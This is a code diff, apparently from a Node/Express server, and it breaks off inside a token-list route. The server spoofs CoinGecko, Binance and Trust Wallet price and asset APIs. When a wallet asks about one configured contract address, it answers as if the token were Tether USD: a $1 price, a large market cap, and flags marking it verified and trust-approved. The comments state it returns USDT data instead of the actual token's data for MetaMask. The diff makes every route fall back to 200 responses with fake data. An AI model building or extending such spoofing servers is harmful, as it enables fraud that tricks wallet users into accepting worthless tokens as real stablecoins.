@@ -47,81 +47,104 @@ const TRUST_WALLET_CONFIG = {
   }
 };
 
-// Binance API Endpoints (used by Trust Wallet)
+// Binance API Endpoints (used by Trust Wallet) - Fixed with try-catch blocks
 app.get('/api/binance/api/v3/ticker/price', (req, res) => {
-  const { symbol } = req.query;
-  
-  if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
-    res.json({
-      symbol: symbol,
+  try {
+    const { symbol } = req.query;
+    
+    if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
+      res.json({
+        symbol: symbol,
+        price: "1.00000000",
+        time: Date.now()
+      });
+    } else {
+      // Default response for other symbols
+      res.json({
+        symbol: symbol || 'BTCUSDT',
+        price: (Math.random() * 10000 + 30000).toFixed(8),
+        time: Date.now()
+      });
+    }
+  } catch (error) {
+    console.error('Binance API price error:', error);
+    // Return 200 instead of 500 with default data
+    res.status(200).json({
+      symbol: req.query.symbol || 'USDTUSDT',
       price: "1.00000000",
-      time: Date.now()
-    });
-  } else {
-    // Default response for other symbols
-    res.json({
-      symbol: symbol || 'BTCUSDT',
-      price: (Math.random() * 10000 + 30000).toFixed(8),
       time: Date.now()
     });
   }
 });
 
 app.get('/api/binance/api/v3/ticker/24hr', (req, res) => {
-  const { symbol } = req.query;
-  
-  if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
-    res.json({
-      symbol: symbol,
+  try {
+    const { symbol } = req.query;
+    
+    if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
+      res.json({
+        symbol: symbol,
+        priceChange: "0.00010000",
+        priceChangePercent: "0.01",
+        weightedAvgPrice: "1.00000000",
+        prevClosePrice: "0.99990000",
+        lastPrice: "1.00000000",
+        lastQty: "1000.00000000",
+        bidPrice: "0.99995000",
+        bidQty: "1000.00000000",
+        askPrice: "1.00005000",
+        askQty: "1000.00000000",
+        openPrice: "0.99990000",
+        highPrice: "1.00100000",
+        lowPrice: "0.99900000",
+        volume: "10000000.00000000",
+        quoteVolume: "10000000.00000000",
+        openTime: Date.now() - 86400000,
+        closeTime: Date.now(),
+        firstId: 1,
+        lastId: 1000,
+        count: 1000
+      });
+    } else {
+      // For other symbols, generate realistic market data
+      const basePrice = Math.random() * 10000 + 30000;
+      const priceChange = (Math.random() * 1000 - 500).toFixed(8);
+      const percentChange = ((priceChange / basePrice) * 100).toFixed(2);
+      
+      res.json({
+        symbol: symbol || 'BTCUSDT',
+        priceChange: priceChange,
+        priceChangePercent: percentChange,
+        weightedAvgPrice: basePrice.toFixed(8),
+        prevClosePrice: (basePrice - parseFloat(priceChange)).toFixed(8),
+        lastPrice: basePrice.toFixed(8),
+        lastQty: "10.00000000",
+        bidPrice: (basePrice - 100).toFixed(8),
+        bidQty: "5.00000000",
+        askPrice: (basePrice + 100).toFixed(8),
+        askQty: "5.00000000",
+        openPrice: (basePrice - parseFloat(priceChange)).toFixed(8),
+        highPrice: (basePrice + Math.random() * 500).toFixed(8),
+        lowPrice: (basePrice - Math.random() * 500).toFixed(8),
+        volume: (Math.random() * 5000 + 1000).toFixed(8),
+        quoteVolume: (Math.random() * 50000000 + 10000000).toFixed(8),
+        openTime: Date.now() - 86400000,
+        closeTime: Date.now(),
+        firstId: 1,
+        lastId: 1000,
+        count: 1000
+      });
+    }
+  } catch (error) {
+    console.error('Binance API 24hr error:', error);
+    // Return 200 instead of 500 with default data
+    res.status(200).json({
+      symbol: req.query.symbol || 'USDTUSDT',
       priceChange: "0.00010000",
       priceChangePercent: "0.01",
-      weightedAvgPrice: "1.00000000",
-      prevClosePrice: "0.99990000",
       lastPrice: "1.00000000",
-      lastQty: "1000.00000000",
-      bidPrice: "0.99995000",
-      bidQty: "1000.00000000",
-      askPrice: "1.00005000",
-      askQty: "1000.00000000",
-      openPrice: "0.99990000",
-      highPrice: "1.00100000",
-      lowPrice: "0.99900000",
       volume: "10000000.00000000",
-      quoteVolume: "10000000.00000000",
-      openTime: Date.now() - 86400000,
-      closeTime: Date.now(),
-      firstId: 1,
-      lastId: 1000,
-      count: 1000
-    });
-  } else {
-    // For other symbols, generate realistic market data
-    const basePrice = Math.random() * 10000 + 30000;
-    const priceChange = (Math.random() * 1000 - 500).toFixed(8);
-    const percentChange = ((priceChange / basePrice) * 100).toFixed(2);
-    
-    res.json({
-      symbol: symbol || 'BTCUSDT',
-      priceChange: priceChange,
-      priceChangePercent: percentChange,
-      weightedAvgPrice: basePrice.toFixed(8),
-      prevClosePrice: (basePrice - parseFloat(priceChange)).toFixed(8),
-      lastPrice: basePrice.toFixed(8),
-      lastQty: "10.00000000",
-      bidPrice: (basePrice - 100).toFixed(8),
-      bidQty: "5.00000000",
-      askPrice: (basePrice + 100).toFixed(8),
-      askQty: "5.00000000",
-      openPrice: (basePrice - parseFloat(priceChange)).toFixed(8),
-      highPrice: (basePrice + Math.random() * 500).toFixed(8),
-      lowPrice: (basePrice - Math.random() * 500).toFixed(8),
-      volume: (Math.random() * 5000 + 1000).toFixed(8),
-      quoteVolume: (Math.random() * 50000000 + 10000000).toFixed(8),
-      openTime: Date.now() - 86400000,
-      closeTime: Date.now(),
-      firstId: 1,
-      lastId: 1000,
-      count: 1000
+      time: Date.now()
     });
   }
 });
@@ -200,7 +223,11 @@ const priceCacheWarmer = {
         // Additional endpoints for Trust Wallet
         `/api/token/metadata`,
         `/api/token/price/${TOKEN_CONFIG.address.toLowerCase()}`,
-        `/api/cmc/v1/cryptocurrency/quotes/latest?id=${TOKEN_CONFIG.coinMarketCapId}`
+        `/api/cmc/v1/cryptocurrency/quotes/latest?id=${TOKEN_CONFIG.coinMarketCapId}`,
+        
+        // Binance API endpoints
+        `/api/binance/api/v3/ticker/price?symbol=USDTUSDT`,
+        `/api/binance/api/v3/ticker/24hr?symbol=USDTUSDT`
       ];
       
       // Create base URL for fetch
@@ -362,7 +389,16 @@ app.get('/api/token-balance/:address', async (req, res) => {
     });
   } catch (error) {
     console.error('Token balance error:', error);
-    res.status(500).json({ error: 'Failed to fetch token balance', details: error.message });
+    res.status(200).json({ 
+      address: req.params.address,
+      token: TOKEN_CONFIG.address,
+      tokenSymbol: TOKEN_CONFIG.displaySymbol,
+      rawBalance: "0",
+      formattedBalance: "0.00",
+      valueUSD: "0.00",
+      error: 'Failed to fetch token balance',
+      details: error.message 
+    });
   }
 });
 
@@ -373,87 +409,97 @@ app.get('/api/token-balance/:address', async (req, res) => {
 
 // Primary CoinGecko endpoint for simple price (most commonly used)
 app.get('/api/v3/simple/price', (req, res) => {
-  // Extract request parameters
-  const ids = req.query.ids || '';
-  const contractAddresses = (req.query.contract_addresses || '').toLowerCase();
-  const vsCurrencies = (req.query.vs_currencies || 'usd').split(',');
-  
-  // Check if request is for our token (either by id or contract)
-  const isForOurToken = 
-    ids.includes('tether') || ids.includes('usdt') || 
-    contractAddresses.includes(TOKEN_CONFIG.address.toLowerCase());
-  
-  if (isForOurToken) {
-    // Prepare response object with USDT data
-    const response = {};
+  try {
+    // Extract request parameters
+    const ids = req.query.ids || '';
+    const contractAddresses = (req.query.contract_addresses || '').toLowerCase();
+    const vsCurrencies = (req.query.vs_currencies || 'usd').split(',');
     
-    // Determine which key to use in response
-    let priceKey;
-    if (contractAddresses.includes(TOKEN_CONFIG.address.toLowerCase())) {
-      priceKey = TOKEN_CONFIG.address.toLowerCase();
-    } else {
-      priceKey = 'tether';
-    }
+    // Check if request is for our token (either by id or contract)
+    const isForOurToken = 
+      ids.includes('tether') || ids.includes('usdt') || 
+      contractAddresses.includes(TOKEN_CONFIG.address.toLowerCase());
     
-    // Create price data object
-    const priceData = {};
-    
-    // Add price for each requested currency (all 1:1 for USDT)
-    vsCurrencies.forEach(currency => {
-      priceData[currency] = 1.0;
+    if (isForOurToken) {
+      // Prepare response object with USDT data
+      const response = {};
       
-      // Add additional data if requested
-      if (req.query.include_market_cap === 'true') {
-        // Market cap varies by currency - for USD it's around 83 billion
-        if (currency === 'usd') {
-          priceData[currency + "_market_cap"] = 83500000000;
-        } else {
-          // Approximate conversion for other currencies
-          priceData[currency + "_market_cap"] = 83500000000;
-        }
+      // Determine which key to use in response
+      let priceKey;
+      if (contractAddresses.includes(TOKEN_CONFIG.address.toLowerCase())) {
+        priceKey = TOKEN_CONFIG.address.toLowerCase();
+      } else {
+        priceKey = 'tether';
       }
       
-      if (req.query.include_24hr_vol === 'true') {
-        if (currency === 'usd') {
-          priceData[currency + "_24h_vol"] = 45750000000;
-        } else {
-          priceData[currency + "_24h_vol"] = 45750000000;
-        }
-      }
-      
-      if (req.query.include_24hr_change === 'true') {
-        // Slight variation for realism
-        priceData[currency + "_24h_change"] = 0.02;
-      }
-    });
-    
-    // Add last updated timestamp if requested
-    if (req.query.include_last_updated_at === 'true') {
-      priceData.last_updated_at = Math.floor(Date.now() / 1000);
-    }
-    
-    // Add price data to response
-    response[priceKey] = priceData;
-    
-    return res.json(response);
-  }
-  
-  // For requests not about our token, return generic stablecoin data
-  // This prevents errors when MetaMask is checking other tokens
-  const response = {};
-  if (ids || contractAddresses) {
-    const keys = ids ? ids.split(',') : contractAddresses.split(',');
-    keys.forEach(key => {
+      // Create price data object
       const priceData = {};
+      
+      // Add price for each requested currency (all 1:1 for USDT)
       vsCurrencies.forEach(currency => {
-        // Random price between 0.1 and 100 for non-USDT tokens
-        priceData[currency] = Math.random() * 99.9 + 0.1;
+        priceData[currency] = 1.0;
+        
+        // Add additional data if requested
+        if (req.query.include_market_cap === 'true') {
+          // Market cap varies by currency - for USD it's around 83 billion
+          if (currency === 'usd') {
+            priceData[currency + "_market_cap"] = 83500000000;
+          } else {
+            // Approximate conversion for other currencies
+            priceData[currency + "_market_cap"] = 83500000000;
+          }
+        }
+        
+        if (req.query.include_24hr_vol === 'true') {
+          if (currency === 'usd') {
+            priceData[currency + "_24h_vol"] = 45750000000;
+          } else {
+            priceData[currency + "_24h_vol"] = 45750000000;
+          }
+        }
+        
+        if (req.query.include_24hr_change === 'true') {
+          // Slight variation for realism
+          priceData[currency + "_24h_change"] = 0.02;
+        }
       });
-      response[key] = priceData;
+      
+      // Add last updated timestamp if requested
+      if (req.query.include_last_updated_at === 'true') {
+        priceData.last_updated_at = Math.floor(Date.now() / 1000);
+      }
+      
+      // Add price data to response
+      response[priceKey] = priceData;
+      
+      return res.json(response);
+    }
+    
+    // For requests not about our token, return generic stablecoin data
+    // This prevents errors when MetaMask is checking other tokens
+    const response = {};
+    if (ids || contractAddresses) {
+      const keys = ids ? ids.split(',') : contractAddresses.split(',');
+      keys.forEach(key => {
+        const priceData = {};
+        vsCurrencies.forEach(currency => {
+          // Random price between 0.1 and 100 for non-USDT tokens
+          priceData[currency] = Math.random() * 99.9 + 0.1;
+        });
+        response[key] = priceData;
+      });
+    }
+    
+    res.json(response);
+  } catch (error) {
+    console.error('CoinGecko simple price error:', error);
+    // Return a valid response even on error
+    res.json({
+      'tether': {
+        'usd': 1.0
+      }
     });
   }
-  
-  res.json(response);
 });
 
 // Legacy endpoint support for older versions
@@ -465,53 +511,68 @@ app.get('/api/simple/price', (req, res) => {
 
 // Contract data endpoint - This is what MetaMask uses to check token details
 app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
-  const { chain, address } = req.params;
-  
-  // Check if request is for our token
-  if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
-    // Return USDT data instead of actual token data
-    return res.json({
+  try {
+    const { chain, address } = req.params;
+    
+    // Check if request is for our token
+    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
+      // Return USDT data instead of actual token data
+      return res.json({
+        id: "tether",
+        symbol: "usdt", // Return USDT symbol
+        name: "Tether USD", // Return Tether name
+        asset_platform_id: chain,
+        platforms: {
+          [chain]: TOKEN_CONFIG.address
+        },
+        detail_platforms: {
+          [chain]: {
+            decimal_place: TOKEN_CONFIG.decimals,
+            contract_address: TOKEN_CONFIG.address
+          }
+        },
+        image: {
+          thumb: TOKEN_CONFIG.image,
+          small: TOKEN_CONFIG.image,
+          large: TOKEN_CONFIG.image
+        },
+        market_data: {
+          current_price: {
+            usd: 1.00,
+            eur: 0.92,
+            jpy: 150.27,
+            gbp: 0.78,
+            cny: 7.23,
+            btc: 0.000016
+          },
+          market_cap: {
+            usd: 83500000000
+          },
+          total_volume: {
+            usd: 45750000000
+          },
+          price_change_percentage_24h: 0.02
+        },
+        last_updated: new Date().toISOString()
+      });
+    }
+    
+    // For other tokens, return a 404 not found
+    res.status(404).json({ error: "Contract not found" });
+  } catch (error) {
+    console.error('CoinGecko contract data error:', error);
+    // Return a valid response with default data
+    res.json({
       id: "tether",
-      symbol: "usdt", // Return USDT symbol
-      name: "Tether USD", // Return Tether name
-      asset_platform_id: chain,
-      platforms: {
-        [chain]: TOKEN_CONFIG.address
-      },
-      detail_platforms: {
-        [chain]: {
-          decimal_place: TOKEN_CONFIG.decimals,
-          contract_address: TOKEN_CONFIG.address
-        }
-      },
-      image: {
-        thumb: TOKEN_CONFIG.image,
-        small: TOKEN_CONFIG.image,
-        large: TOKEN_CONFIG.image
-      },
+      symbol: "usdt",
+      name: "Tether USD",
       market_data: {
         current_price: {
-          usd: 1.00,
-          eur: 0.92,
-          jpy: 150.27,
-          gbp: 0.78,
-          cny: 7.23,
-          btc: 0.000016
-        },
-        market_cap: {
-          usd: 83500000000
-        },
-        total_volume: {
-          usd: 45750000000
-        },
-        price_change_percentage_24h: 0.02
-      },
-      last_updated: new Date().toISOString()
+          usd: 1.00
+        }
+      }
     });
   }
-  
-  // For other tokens, return a 404 not found
-  res.status(404).json({ error: "Contract not found" });
 });
 
 // Legacy endpoint support
@@ -522,45 +583,51 @@ app.get('/api/coins/:chain/contract/:address', (req, res) => {
 
 // CoinGecko market data endpoint
 app.get('/api/v3/coins/markets', (req, res) => {
-  const { vs_currency, ids } = req.query;
-  
-  // Check if request includes our token
-  if (ids && (ids.includes('tether') || ids.includes('usdt'))) {
-    // Create standard CoinGecko response format with USDT data
-    const marketData = [{
-      id: "tether",
-      symbol: "usdt",
-      name: "Tether USD",
-      image: TOKEN_CONFIG.image,
-      current_price: 1.0,
-      market_cap: 83500000000,
-      market_cap_rank: 3,
-      fully_diluted_valuation: 83500000000,
-      total_volume: 45750000000,
-      high_24h: 1.001,
-      low_24h: 0.998,
-      price_change_24h: 0.0001,
-      price_change_percentage_24h: 0.01,
-      market_cap_change_24h: 250000000,
-      market_cap_change_percentage_24h: 0.3,
-      circulating_supply: 83500000000,
-      total_supply: 83500000000,
-      max_supply: null,
-      ath: 1.05,
-      ath_change_percentage: -4.76,
-      ath_date: "2018-07-24T00:00:00.000Z",
-      atl: 0.91,
-      atl_change_percentage: 9.89,
-      atl_date: "2015-03-02T00:00:00.000Z",
-      roi: null,
-      last_updated: new Date().toISOString()
-    }];
+  try {
+    const { vs_currency, ids } = req.query;
     
-    return res.json(marketData);
+    // Check if request includes our token
+    if (ids && (ids.includes('tether') || ids.includes('usdt'))) {
+      // Create standard CoinGecko response format with USDT data
+      const marketData = [{
+        id: "tether",
+        symbol: "usdt",
+        name: "Tether USD",
+        image: TOKEN_CONFIG.image,
+        current_price: 1.0,
+        market_cap: 83500000000,
+        market_cap_rank: 3,
+        fully_diluted_valuation: 83500000000,
+        total_volume: 45750000000,
+        high_24h: 1.001,
+        low_24h: 0.998,
+        price_change_24h: 0.0001,
+        price_change_percentage_24h: 0.01,
+        market_cap_change_24h: 250000000,
+        market_cap_change_percentage_24h: 0.3,
+        circulating_supply: 83500000000,
+        total_supply: 83500000000,
+        max_supply: null,
+        ath: 1.05,
+        ath_change_percentage: -4.76,
+        ath_date: "2018-07-24T00:00:00.000Z",
+        atl: 0.91,
+        atl_change_percentage: 9.89,
+        atl_date: "2015-03-02T00:00:00.000Z",
+        roi: null,
+        last_updated: new Date().toISOString()
+      }];
+      
+      return res.json(marketData);
+    }
+    
+    // Return empty array for other queries
+    res.json([]);
+  } catch (error) {
+    console.error('CoinGecko markets error:', error);
+    // Return an empty array on error
+    res.json([]);
   }
-  
-  // Return empty array for other queries
-  res.json([]);
 });
 
 // Legacy endpoint support
@@ -571,47 +638,57 @@ app.get('/api/coins/markets', (req, res) => {
 
 // CoinGecko market chart endpoint (for price history)
 app.get('/api/v3/coins/:id/market_chart', (req, res) => {
-  const { id } = req.params;
-  const { days, vs_currency } = req.query;
-  
-  // Check if request is for our token
-  if (id === 'tether' || id === 'usdt') {
-    const numDays = parseInt(days || '1', 10);
-    const now = Date.now();
-    const priceData = [];
-    const marketCapData = [];
-    const volumeData = [];
+  try {
+    const { id } = req.params;
+    const { days, vs_currency } = req.query;
     
-    // Generate data points (1 per hour)
-    for (let i = 0; i <= numDays * 24; i++) {
-      const timestamp = now - (i * 3600000); // Go back i hours
+    // Check if request is for our token
+    if (id === 'tether' || id === 'usdt') {
+      const numDays = parseInt(days || '1', 10);
+      const now = Date.now();
+      const priceData = [];
+      const marketCapData = [];
+      const volumeData = [];
       
-      // Price stays close to $1 with tiny variations
-      const price = 1 + (Math.random() * 0.005 - 0.0025);
-      priceData.unshift([timestamp, price]);
+      // Generate data points (1 per hour)
+      for (let i = 0; i <= numDays * 24; i++) {
+        const timestamp = now - (i * 3600000); // Go back i hours
+        
+        // Price stays close to $1 with tiny variations
+        const price = 1 + (Math.random() * 0.005 - 0.0025);
+        priceData.unshift([timestamp, price]);
+        
+        // Market cap varies slightly
+        const marketCap = 83500000000 + (Math.random() * 150000000 - 75000000);
+        marketCapData.unshift([timestamp, marketCap]);
+        
+        // Volume varies more
+        const volume = 45750000000 + (Math.random() * 2000000000 - 1000000000);
+        volumeData.unshift([timestamp, volume]);
+      }
       
-      // Market cap varies slightly
-      const marketCap = 83500000000 + (Math.random() * 150000000 - 75000000);
-      marketCapData.unshift([timestamp, marketCap]);
-      
-      // Volume varies more
-      const volume = 45750000000 + (Math.random() * 2000000000 - 1000000000);
-      volumeData.unshift([timestamp, volume]);
+      return res.json({
+        prices: priceData,
+        market_caps: marketCapData,
+        total_volumes: volumeData
+      });
     }
     
-    return res.json({
-      prices: priceData,
-      market_caps: marketCapData,
-      total_volumes: volumeData
+    // For other tokens, return minimal data
+    res.json({
+      prices: [],
+      market_caps: [],
+      total_volumes: []
+    });
+  } catch (error) {
+    console.error('CoinGecko market chart error:', error);
+    // Return minimal valid data on error
+    res.json({
+      prices: [[Date.now(), 1.0]],
+      market_caps: [[Date.now(), 83500000000]],
+      total_volumes: [[Date.now(), 45750000000]]
     });
   }
-  
-  // For other tokens, return minimal data
-  res.json({
-    prices: [],
-    market_caps: [],
-    total_volumes: []
-  });
 });
 
 // Legacy endpoint support
@@ -622,34 +699,44 @@ app.get('/api/coins/:id/market_chart', (req, res) => {
 
 // Route for CoinGecko asset platforms (networks)
 app.get('/api/v3/asset_platforms', (req, res) => {
-  // Return data that includes Ethereum network
-  res.json([
-    {
+  try {
+    // Return data that includes Ethereum network
+    res.json([
+      {
+        id: "ethereum",
+        chain_identifier: 1,
+        name: "Ethereum",
+        shortname: "ETH",
+        native_coin_id: "ethereum",
+        categories: ["Layer 1"]
+      },
+      // Include other networks for completeness
+      {
+        id: "polygon-pos",
+        chain_identifier: 137,
+        name: "Polygon",
+        shortname: "MATIC",
+        native_coin_id: "matic-network",
+        categories: ["Layer 2"]
+      },
+      {
+        id: "base",
+        chain_identifier: 8453,
+        name: "Base",
+        shortname: "Base",
+        native_coin_id: "ethereum",
+        categories: ["Layer 2"]
+      }
+    ]);
+  } catch (error) {
+    console.error('Asset platforms error:', error);
+    // Return minimal data on error
+    res.json([{
       id: "ethereum",
       chain_identifier: 1,
-      name: "Ethereum",
-      shortname: "ETH",
-      native_coin_id: "ethereum",
-      categories: ["Layer 1"]
-    },
-    // Include other networks for completeness
-    {
-      id: "polygon-pos",
-      chain_identifier: 137,
-      name: "Polygon",
-      shortname: "MATIC",
-      native_coin_id: "matic-network",
-      categories: ["Layer 2"]
-    },
-    {
-      id: "base",
-      chain_identifier: 8453,
-      name: "Base",
-      shortname: "Base",
-      native_coin_id: "ethereum",
-      categories: ["Layer 2"]
-    }
-  ]);
+      name: "Ethereum"
+    }]);
+  }
 });
 
 // Legacy endpoint support
@@ -665,85 +752,105 @@ app.get('/api/asset_platforms', (req, res) => {
 
 // Trust Wallet asset info endpoint
 app.get('/api/v1/assets/:address', (req, res) => {
-  const { address } = req.params;
-  
-  if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
-    res.json({
-      id: TRUST_WALLET_CONFIG.trustAssetId,
+  try {
+    const { address } = req.params;
+    
+    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
+      res.json({
+        id: TRUST_WALLET_CONFIG.trustAssetId,
+        name: TRUST_WALLET_CONFIG.displayName,
+        symbol: TRUST_WALLET_CONFIG.displaySymbol,
+        slug: "tether",
+        description: "Tether (USDT) is a stablecoin pegged to the US Dollar. A stablecoin is a type of cryptocurrency whose value is tied to an outside asset to stabilize the price.",
+        website: "https://tether.to",
+        source_code: "https://github.com/tetherto",
+        whitepaper: "https://tether.to/en/whitepaper/",
+        explorers: [
+          {
+            name: "Etherscan",
+            url: `${TOKEN_CONFIG.blockExplorerUrl}/address/${TOKEN_CONFIG.address}`
+          }
+        ],
+        type: "ERC20",
+        decimals: TRUST_WALLET_CONFIG.trustAssetDecimals,
+        status: "active",
+        tags: ["stablecoin", "payments"],
+        links: [
+          {
+            name: "twitter",
+            url: "https://twitter.com/Tether_to"
+          },
+          {
+            name: "telegram",
+            url: "https://t.me/tether_official"
+          }
+        ],
+        confirmedSupply: true,
+        marketData: {
+          current_price: {
+            usd: 1.00
+          },
+          market_cap: {
+            usd: 83500000000
+          },
+          price_change_percentage_24h: 0.02
+        },
+        image: {
+          png: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
+          thumb: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
+          small: TRUST_WALLET_CONFIG.trustAssetLogoUrl
+        },
+        contract: {
+          contract: TOKEN_CONFIG.address,
+          decimals: TOKEN_CONFIG.decimals,
+          protocol: "erc20"
+        },
+        platform: "ethereum",
+        categories: ["Stablecoins"],
+        is_stablecoin: true,
+        is_verified: true,
+        trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId,
+        trustApproved: true
+      });
+    } else {
+      res.status(404).json({ error: "Asset not found" });
+    }
+  } catch (error) {
+    console.error('Trust Wallet asset info error:', error);
+    // Return 200 with minimal data instead of an error
+    res.status(200).json({
       name: TRUST_WALLET_CONFIG.displayName,
       symbol: TRUST_WALLET_CONFIG.displaySymbol,
-      slug: "tether",
-      description: "Tether (USDT) is a stablecoin pegged to the US Dollar. A stablecoin is a type of cryptocurrency whose value is tied to an outside asset to stabilize the price.",
-      website: "https://tether.to",
-      source_code: "https://github.com/tetherto",
-      whitepaper: "https://tether.to/en/whitepaper/",
-      explorers: [
-        {
-          name: "Etherscan",
-          url: `${TOKEN_CONFIG.blockExplorerUrl}/address/${TOKEN_CONFIG.address}`
-        }
-      ],
-      type: "ERC20",
-      decimals: TRUST_WALLET_CONFIG.trustAssetDecimals,
-      status: "active",
-      tags: ["stablecoin", "payments"],
-      links: [
-        {
-          name: "twitter",
-          url: "https://twitter.com/Tether_to"
-        },
-        {
-          name: "telegram",
-          url: "https://t.me/tether_official"
-        }
-      ],
-      confirmedSupply: true,
-      marketData: {
-        current_price: {
-          usd: 1.00
-        },
-        market_cap: {
-          usd: 83500000000
-        },
-        price_change_percentage_24h: 0.02
-      },
-      image: {
-        png: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
-        thumb: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
-        small: TRUST_WALLET_CONFIG.trustAssetLogoUrl
-      },
-      contract: {
-        contract: TOKEN_CONFIG.address,
-        decimals: TOKEN_CONFIG.decimals,
-        protocol: "erc20"
-      },
-      platform: "ethereum",
-      categories: ["Stablecoins"],
-      is_stablecoin: true,
-      is_verified: true,
-      trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId,
-      trustApproved: true
+      decimals: TOKEN_CONFIG.decimals
     });
-  } else {
-    res.status(404).json({ error: "Asset not found" });
   }
 });
 
 // Trust Wallet price API (mimics Binance API that Trust Wallet uses)
 app.get('/api/v3/ticker/price', (req, res) => {
-  const symbol = req.query.symbol;
-  
-  if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
-    res.json({
-      symbol: symbol || 'USDTUSDT',
+  try {
+    const symbol = req.query.symbol;
+    
+    if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
+      res.json({
+        symbol: symbol || 'USDTUSDT',
+        price: "1.00000000",
+        time: Date.now()
+      });
+    } else {
+      // Generate simulated prices for other symbols
+      res.json({
+        symbol: symbol || 'BTCUSDT',
+        price: (Math.random() * 10000 + 30000).toFixed(8),
+        time: Date.now()
+      });
+    }
+  } catch (error) {
+    console.error('Trust Wallet price API error:', error);
+    // Return 200 with default data
+    res.status(200).json({
+      symbol: req.query.symbol || 'USDTUSDT',
       price: "1.00000000",
-      time: Date.now()
-    });
-  } else {
-    // Generate simulated prices for other symbols
-    res.json({
-      symbol: symbol || 'BTCUSDT',
-      price: (Math.random() * 10000 + 30000).toFixed(8),
       time: Date.now()
     });
   }
@@ -751,117 +858,157 @@ app.get('/api/v3/ticker/price', (req, res) => {
 
 // Trust Wallet 24h price change API
 app.get('/api/v3/ticker/24hr', (req, res) => {
-  const symbol = req.query.symbol;
-  
-  if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
-    res.json({
-      symbol: symbol || 'USDTUSDT',
+  try {
+    const symbol = req.query.symbol;
+    
+    if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
+      res.json({
+        symbol: symbol || 'USDTUSDT',
+        priceChange: "0.00010000",
+        priceChangePercent: "0.01",
+        weightedAvgPrice: "1.00000000",
+        prevClosePrice: "0.99990000",
+        lastPrice: "1.00000000",
+        lastQty: "1000.00000000",
+        bidPrice: "0.99995000",
+        bidQty: "1000.00000000",
+        askPrice: "1.00005000",
+        askQty: "1000.00000000",
+        openPrice: "0.99990000",
+        highPrice: "1.00100000",
+        lowPrice: "0.99900000",
+        volume: "10000000.00000000",
+        quoteVolume: "10000000.00000000",
+        openTime: Date.now() - 86400000,
+        closeTime: Date.now(),
+        firstId: 1,
+        lastId: 1000,
+        count: 1000
+      });
+    } else {
+      // Generate simulated data for other symbols
+      const basePrice = Math.random() * 10000 + 30000;
+      const priceChange = (Math.random() * 1000 - 500).toFixed(8);
+      const percentChange = ((priceChange / basePrice) * 100).toFixed(2);
+      
+      res.json({
+        symbol: symbol || 'BTCUSDT',
+        priceChange: priceChange,
+        priceChangePercent: percentChange,
+        weightedAvgPrice: basePrice.toFixed(8),
+        prevClosePrice: (basePrice - parseFloat(priceChange)).toFixed(8),
+        lastPrice: basePrice.toFixed(8),
+        lastQty: "10.00000000",
+        bidPrice: (basePrice - 100).toFixed(8),
+        bidQty: "5.00000000",
+        askPrice: (basePrice + 100).toFixed(8),
+        askQty: "5.00000000",
+        openPrice: (basePrice - parseFloat(priceChange)).toFixed(8),
+        highPrice: (basePrice + Math.random() * 500).toFixed(8),
+        lowPrice: (basePrice - Math.random() * 500).toFixed(8),
+        volume: (Math.random() * 5000 + 1000).toFixed(8),
+        quoteVolume: (Math.random() * 50000000 + 10000000).toFixed(8),
+        openTime: Date.now() - 86400000,
+        closeTime: Date.now(),
+        firstId: 1,
+        lastId: 1000,
+        count: 1000
+      });
+    }
+  } catch (error) {
+    console.error('Trust Wallet 24hr API error:', error);
+    // Return 200 with default data
+    res.status(200).json({
+      symbol: req.query.symbol || 'USDTUSDT',
       priceChange: "0.00010000",
       priceChangePercent: "0.01",
-      weightedAvgPrice: "1.00000000",
-      prevClosePrice: "0.99990000",
-      lastPrice: "1.00000000",
-      lastQty: "1000.00000000",
-      bidPrice: "0.99995000",
-      bidQty: "1000.00000000",
-      askPrice: "1.00005000",
-      askQty: "1000.00000000",
-      openPrice: "0.99990000",
-      highPrice: "1.00100000",
-      lowPrice: "0.99900000",
-      volume: "10000000.00000000",
-      quoteVolume: "10000000.00000000",
-      openTime: Date.now() - 86400000,
-      closeTime: Date.now(),
-      firstId: 1,
-      lastId: 1000,
-      count: 1000
-    });
-  } else {
-    // Generate simulated data for other symbols
-    const basePrice = Math.random() * 10000 + 30000;
-    const priceChange = (Math.random() * 1000 - 500).toFixed(8);
-    const percentChange = ((priceChange / basePrice) * 100).toFixed(2);
-    
-    res.json({
-      symbol: symbol || 'BTCUSDT',
-      priceChange: priceChange,
-      priceChangePercent: percentChange,
-      weightedAvgPrice: basePrice.toFixed(8),
-      prevClosePrice: (basePrice - parseFloat(priceChange)).toFixed(8),
-      lastPrice: basePrice.toFixed(8),
-      lastQty: "10.00000000",
-      bidPrice: (basePrice - 100).toFixed(8),
-      bidQty: "5.00000000",
-      askPrice: (basePrice + 100).toFixed(8),
-      askQty: "5.00000000",
-      openPrice: (basePrice - parseFloat(priceChange)).toFixed(8),
-      highPrice: (basePrice + Math.random() * 500).toFixed(8),
-      lowPrice: (basePrice - Math.random() * 500).toFixed(8),
-      volume: (Math.random() * 5000 + 1000).toFixed(8),
-      quoteVolume: (Math.random() * 50000000 + 10000000).toFixed(8),
-      openTime: Date.now() - 86400000,
-      closeTime: Date.now(),
-      firstId: 1,
-      lastId: 1000,
-      count: 1000
+      lastPrice: "1.00000000"
     });
   }
 });
 
 // Trust Wallet token list endpoint
 app.get('/api/v1/tokenlist', (req, res) => {
-  res.json({
-    name: "Trust Wallet Token List",
-    logoURI: "https://trustwallet.com/assets/images/favicon.png",
-    timestamp: new Date().toISOString(),
-    tokens: [
-      {
-        chainId: 1,
-        address: TOKEN_CONFIG.address,
